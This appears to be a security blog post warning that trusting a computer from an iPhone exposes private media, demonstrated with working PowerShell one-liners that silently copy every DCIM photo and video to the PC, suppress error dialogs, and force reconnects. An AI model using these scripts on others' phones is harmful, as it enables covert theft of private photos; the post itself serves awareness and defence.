---
title: "Do not trust this device"
author: i4
date: M08-05-2022
---


## Good evening neighboors

Plugging in your iPhone and trusting the device is almost always never a good idea.  
In this post I'd like to show you how a malicious machine/user can extract your images and videos from your phone without your knowledge.

![trust](/b/images/trust.jpg)

### tldr;
It's really insecure to allow the attached device access to your phone.  
Extracting images and videos from an iPhone isn't really hard.  
There are some technical difficulties but they are relatively simply be overcome.

### Tec stuff
Microsoft uses mtp (Media Transfer Protocol) to communicate with your phone. While the protocol itself isn't extremely complex it's 
not natively supported by a wide range of script languages (Powershell included).  
Powershell can use Windows classes which in turn have access to the underlying COMObjects.


### Checking if a phone is connected
We need to check if there's a phone connected and the user trusted the device (Happens all the time)  
I use this simple one liner to check it.

```
$i=((new-object -com Shell.Application).NameSpace(17).self).GetFolder.items() | Where {$_.name -eq "Apple iPhone"};$p=$i.GetFolder.items();$p.GetFolder
```

You'll receive the following output:  

```
Application  : System.__ComObject
Parent       : System.__ComObject
Name         : Internal Storage
Path         : ::{UUID}\\\?\usb#vid_05ac&pid_12a8&mi_00#6&21cec13f&0&0000#{UUID}
GetLink      :
GetFolder    : System.__ComObject
IsLink       : False
IsFolder     : True
IsFileSystem : False
IsBrowsable  : False
```

If there's no return value the user didn't trust the machine (Like he shouldn't have in the first place) or there isn't a phone attached and you're out of luck.

## The fun begins
Now for the heavy lifting we'll need to initialize the ComObject.
```
$shell = new-object -com Shell.Application
$shellItem = $shell.NameSpace(17).self
```
NameSpace 17 is just a fancy way to address the special folder "This PC".

![Namespace](/b/images/namespace_17.png)


Now we can get access the phone through it's Internal Storage.
```
$phone = $shellItem.GetFolder.items() | where { $_.name -eq "Apple iPhone" }
$rootFolder = $phone.GetFolder.items() | where { $_.Name -eq "Internal Storage" }
```

There aren't many directories accessable over mtp. So we can use the default Digital Camera Images folder.
```
$subfolder = $rootFolder.GetFolder.items() | where { $_.Name -eq "DCIM" }
```

Now you can manually search for interesting folder names and extract anything that you're interested in.

_Look manually into it_
```
$subfolder.GetFolder.items() | select Name
```

If you found a folder that you're interested in you can traverse down and load the files in an array.
```
$appleFolder = $subfolder.GetFolder.items() | where { $_.Name -eq "102APPLE" }
$items = @($appleFolder.GetFolder.items() | where {$_.Name -match "IMG_*"})
```

We've only selected images here but it's possible to select videos as well.
The last thing we need to do is copy them somewhere to extract them.  
We can't use Copy-File or other methods due the incompatibility with ComObjects.  
Luckily there's a .Net copy function.

```
$dst = $shellItem.GetFolder.items() | where { $_.name -eq "Pictures" }
$dst.GetFolder.CopyHere($items[1]), 1024)
```
1024 tells the device to not show a user interface on error.  
Please note that this is quite unstable and in almost all cases I've lost connection after 3-4 successful transfers.

So I've ended up copying the files in smaller chunks `($items[1...x])` instead of using a For loop.

If the connection drops, you'll need to reconnect the device like this. Which will only work with administrative rights though.

```
Get-PnpDevice | where {$_.Name -eq "Apple iPhone"} | Disable-PnpDevice | Enable-PnpDevice
```

Everything in a nice one liner:
```
$r=((new-object -com Shell.Application).NameSpace(17).self).GetFolder.items();$i=$r|where{$_.Name-eq"Apple iPhone"};$d=$i.GetFolder.items()|where{$_.name-eq"Pictures"};$f=$i.GetFolder.items()|where{$_.Name-eq"Internal Storage"};$rt=$f.GetFolder.items()|where{$_.Name-eq"DCIM"};$rt.GetFolder.items()|%{$_.GetFolder.items()|%{($r|where{$_.Path-like"*Pictures"}).GetFolder.CopyHere($_,1024)}}
```

This copies everything from the DCIM folder to `$env:USERPROFILE\Pictures`.

### Conclusion
If you trust your device, you trust everything that has access to your computer.  
Your phone has no idea if the connection comes from you or another user/service.  

Never allow a device to access your phone and if you really need to, unplug your phone after the transfer.
